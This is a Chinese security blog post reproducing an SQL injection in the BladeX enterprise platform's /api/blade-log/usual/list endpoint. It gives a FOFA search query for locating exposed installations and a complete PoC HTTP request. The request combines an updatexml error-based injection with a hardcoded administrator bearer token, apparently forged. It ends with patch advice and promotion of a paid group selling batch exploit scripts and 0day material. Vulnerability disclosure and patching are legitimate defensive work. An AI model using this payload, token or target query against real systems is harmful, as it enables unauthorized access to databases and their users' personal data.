#  「漏洞复现」BladeX企业级开发平台 usual/list SQL 注入漏洞   
冷漠安全  冷漠安全   2024-08-07 16:39  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
BladeX是一款精心设计的微服务架构，提供 SpringCloud 全套解决方案，开源中国首批完美集成 SpringCloud Alibaba 系列组件的微服务架构，基于稳定生产的商业项目升级优化而来，更加贴近企业级的需求，追求企业开发更加高效。  
  
0x03  
  
**漏洞威胁**  
  
BladeX企业级开发平台 usual/list 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="https://bladex.vip"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rRicutKkuqcDy5BiboMFFnFqdrKMXu37KDpaTHZam1fu6eK1l2CnOYd6ETd9c8SQxmcrMIMepq6IzQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
```  
  
查询当前用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rRicutKkuqcDy5BiboMFFnFqUxichcWEXJ1evVHUuuOgTI9aMNbumuZCnITicibH6cnK3hnbY2Doh8wWA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rRicutKkuqcDy5BiboMFFnFqkibetbDWjQoYe7sp0ibriaPkxfFtEDianxXhWuP13LbqrCDgQ4BooVzwZQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
⼚商已发布了漏洞修复程序，请及时关注更新：  
```
https://github.com/chillzhuang/blade-tool
```  
  
通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。  
  
如⾮必要，禁⽌公⽹访问该系统。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rRicutKkuqcDy5BiboMFFnFqCbod7T2WaEKesicoZL76qAsic40KdzbwIbD7OUgWlMD8Dk6iauNJiboyow/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rRicutKkuqcDy5BiboMFFnFq0CFwxdZckHOrGXYDc2aEBCnDaKRV29iaYmYDTxTxQicASxiax5PX2MxPQ/640?wx_fmt=gif&from=appmsg "")  
  
  
